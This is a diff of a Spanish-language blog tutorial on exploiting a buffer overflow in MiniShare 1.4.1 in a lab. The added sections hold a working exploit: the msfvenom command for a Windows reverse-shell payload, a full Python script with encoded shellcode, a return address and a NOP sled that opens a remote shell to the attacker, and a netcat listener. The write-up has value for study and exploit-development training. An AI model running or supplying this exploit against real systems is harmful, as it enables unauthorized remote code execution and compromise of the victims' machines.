@@ -23,7 +23,7 @@ En este articulo haremos un buffer overflow al software Minishare 1.4.1, desbord
 #### Requisitos 
 
 - Immunity Debugger ( Plugin Mona )
-- Windows 7 32 bits - Proteccion Dep desactivado ( Victima )
+- Windows XP sp1 (Victima)
 - Kali Linux ( Atacante ) 
 
 #### Escanear Maquina Victima
@@ -35,7 +35,7 @@ nmap -sS -sV -p- --open 192.168.1.34 -Pn
 ```
 
 <p align="center">
-<img src="/assets/images/buffer-overflow-minishare/scan-nmap-minishare.jpg.png">
+<img src="/assets/images/buffer-overflow-minishare/scan-nmap-minishare.jpg">
 </p>
 
 #### Creando Template
@@ -102,7 +102,7 @@ como podemos ver mandamos en cada ciclo 100 'A's y la aplicacion crasheo en 3100
 
 #### Find EIP
 
-Ya sabemos que la aplicacion crashea en 3100 'A's y EIP sigue apuntando en 41414141. Entonces ahora nesecitamos saber cuantos bytes son nesecarios para poder pisar EIP que no servira para controlar el flujo de la aplicacion, para esto enviaremos un patron de bytes unico que nos servira para calcular en cuantos bytes hacernos con la EIP.
+Ya sabemos que la aplicacion crashea en 3100 'A's y EIP sigue apuntando en 41414141. Entonces ahora nesecitamos saber cuantos bytes son nesecarios para poder pisar EIP que nos servira para controlar el flujo de la aplicacion, para esto enviaremos un patron de bytes unico que nos servira para calcular en cuantos bytes hacernos con la EIP.
 
 hay herramientas para esto como: 
 - msf-pattern_create, msf-pattern_offset ( vienen en Kali o Parrot por Defecto)
@@ -190,10 +190,10 @@ Genial podimos pisar el EIP con unos BBBB
 
 En esta parte nesecitamos encontrar los badchards y nos hacemos la pregunta que son ? La respuesta es sencilla nuestro objetivo es usar una shellcode en nuestro script que nos permita conectarse a nuestra maquina. Sin embargo existen caracteres malos en la aplicacion que cortaran nuestra shellcode como por ejemplo \x00. Entonces sera un trabajo repetivo pero debemos encontrarlos a todos enviando una lista de bytes desde 0 (\x00) hasta 255 (\xff) y ver en donde se corta. Asi de esta manera omitiremos estos badchars en nuestra shellcode.
 
-Asi que ejecutaremos en mona el siguiente comando para que nos genere un byterray de badchars excluyendo \x00 
+Asi que ejecutaremos en mona el siguiente comando para que nos genere un byterray de badchars 
 
 ```bash
-!mona byterray -cpb \x00
+!mona bytearray
 ```
 
 copiaremos los badchars del archivo que creo mona a nuestro script
@@ -236,14 +236,14 @@ Al ejecutar nuestro script podemos ver que no notamos nada diferente pero bueno 
 Como podemos ver mona nos indica cual es el badchar
 
 <p align="center">
-<img src="/assets/images/buffer-overflow-minishare/badchar.jpg">
+<img src="/assets/images/buffer-overflow-minishare/badchar1.jpg">
 </p>
 
 
-Entonces eliminaremos dicho badchar de nuestro script y generaremos otro excluyendo \x00\x0d
+Entonces eliminaremos dicho badchar de nuestro script y generaremos otro excluyendo \x00
 
 ```bash
-!mona byterray -cpb \x00\x0d
+!mona byterray -cpb \x00
 ```
 
 Repetiremos el mismo proceso hasta que mona ya no nos arroje mas badchars, como resultado solo tenemos dos badchars \x00\x0d
@@ -253,3 +253,119 @@ Repetiremos el mismo proceso hasta que mona ya no nos arroje mas badchars, como 
 </p>
 
 #### JMP ESP
+
+Ahora nesecitaremos buscar una direccion que contenga un jmp esp libre de protecciones para poder ejecutar nuestra shellcode, esto lo haremos ejecutando el comando copiaremos dicha direccion para usarlo en nuestro script
+
+```bash
+!mona jmp -r esp
+```
+
+<p align="center">
+<img src="/assets/images/buffer-overflow-minishare/jmp-esp.jpg">
+</p>
+
+copiaremos dicha direccion para usarlo en nuestro script, para ello usaremos la libreria struct para no tener problemas con el litle endian
+
+```python
+#!/usr/local/bin
+import socket
+import struct
+
+ip = '192.168.1.25'
+port = 80
+
+junk = "A" * 1787
+
+buffer = junk + struct.pack('<L', 0x7C9D30D7) + "C" * 100 # Agregamos unos C's a modo de prueba
+try:
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((ip, port))		
+	s.send('GET ' + buffer + 'HTTP/1.1\r\n\r\n')		
+	s.close()
+except:
+	print("Error en conexion!")
+```
+
+
+
+#### Shellcode
+
+llegamos a la parte mas importante generar nuestra shellcode lo haremos de esta forma con este comando
+
+```bash
+msfvenom -p windows/shell_reverse_tcp lhost=IpAtacante lport=4444 EXITFUNC=thread -a x86 --platform windows -b "\x00\x0d" -e x86/shikata_ga_nai -f c
+```
+
+<p align="center">
+<img src="/assets/images/buffer-overflow-minishare/shellcode.jpg">
+</p>
+
+
+#### Creando Exploit
+
+Genial muchachos ya tenemos todo lo nesecario para crear nuestro exploit que se genere una shell remota, para esto nesecitaremos copiar la shell que generamos en nuestro script 
+
+```python
+#!/usr/local/bin
+import socket
+import struct
+
+ip = '192.168.1.25' # ip victima
+port = 80
+
+junk = "A" * 1787
+shellcode = (
+"\xbd\xa8\xfa\xbe\xbd\xda\xc9\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
+"\x52\x83\xc2\x04\x31\x6a\x0e\x03\xc2\xf4\x5c\x48\xee\xe1\x23"
+"\xb3\x0e\xf2\x43\x3d\xeb\xc3\x43\x59\x78\x73\x74\x29\x2c\x78"
+"\xff\x7f\xc4\x0b\x8d\x57\xeb\xbc\x38\x8e\xc2\x3d\x10\xf2\x45"
+"\xbe\x6b\x27\xa5\xff\xa3\x3a\xa4\x38\xd9\xb7\xf4\x91\x95\x6a"
+"\xe8\x96\xe0\xb6\x83\xe5\xe5\xbe\x70\xbd\x04\xee\x27\xb5\x5e"
+"\x30\xc6\x1a\xeb\x79\xd0\x7f\xd6\x30\x6b\x4b\xac\xc2\xbd\x85"
+"\x4d\x68\x80\x29\xbc\x70\xc5\x8e\x5f\x07\x3f\xed\xe2\x10\x84"
+"\x8f\x38\x94\x1e\x37\xca\x0e\xfa\xc9\x1f\xc8\x89\xc6\xd4\x9e"
+"\xd5\xca\xeb\x73\x6e\xf6\x60\x72\xa0\x7e\x32\x51\x64\xda\xe0"
+"\xf8\x3d\x86\x47\x04\x5d\x69\x37\xa0\x16\x84\x2c\xd9\x75\xc1"
+"\x81\xd0\x85\x11\x8e\x63\xf6\x23\x11\xd8\x90\x0f\xda\xc6\x67"
+"\x6f\xf1\xbf\xf7\x8e\xfa\xbf\xde\x54\xae\xef\x48\x7c\xcf\x7b"
+"\x88\x81\x1a\x2b\xd8\x2d\xf5\x8c\x88\x8d\xa5\x64\xc2\x01\x99"
+"\x95\xed\xcb\xb2\x3c\x14\x9c\x7c\x68\x17\x61\x15\x6b\x17\x88"
+"\xb9\xe2\xf1\xc0\x51\xa3\xaa\x7c\xcb\xee\x20\x1c\x14\x25\x4d"
+"\x1e\x9e\xca\xb2\xd1\x57\xa6\xa0\x86\x97\xfd\x9a\x01\xa7\x2b"
+"\xb2\xce\x3a\xb0\x42\x98\x26\x6f\x15\xcd\x99\x66\xf3\xe3\x80"
+"\xd0\xe1\xf9\x55\x1a\xa1\x25\xa6\xa5\x28\xab\x92\x81\x3a\x75"
+"\x1a\x8e\x6e\x29\x4d\x58\xd8\x8f\x27\x2a\xb2\x59\x9b\xe4\x52"
+"\x1f\xd7\x36\x24\x20\x32\xc1\xc8\x91\xeb\x94\xf7\x1e\x7c\x11"
+"\x80\x42\x1c\xde\x5b\xc7\x3c\x3d\x49\x32\xd5\x98\x18\xff\xb8"
+"\x1a\xf7\x3c\xc5\x98\xfd\xbc\x32\x80\x74\xb8\x7f\x06\x65\xb0"
+"\x10\xe3\x89\x67\x10\x26")
+buffer = junk + struct.pack('<L', 0x7C9D30D7) + "\x90"*20 + shellcode
+try:
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((ip, port))		
+	s.send('GET ' + buffer + 'HTTP/1.1\r\n\r\n')		
+	s.close()
+except:
+	print("Error en conexion!")
+```
+
+como ven agregamos antes unos nop's para no tener problemas al ejecutar nuestra shellcode
+
+#### Ejecutar Exploit
+
+Para hacer funcionar nuestro exploit nesecitamos dejar en escucha el puerto 4444 (Puede ser cualquier puerto yo lo puse asi al generar la shellcode con msfvenom)
+
+```bash
+nc -nlvp 4444
+```
+
+ahora correr nuestro exploit
+
+<p align="center">
+<img src="/assets/images/buffer-overflow-minishare/shell-reverse.jpg">
+</p>
+
+
+listo como podemos ver ya pudimos conectacnos con la maquina victima y hemos podido crear un exploit exitosamente. 
+
+Espero que les haya gustado este escrito, tanto como a mi escribirlo. Nos vemos AbelJM 
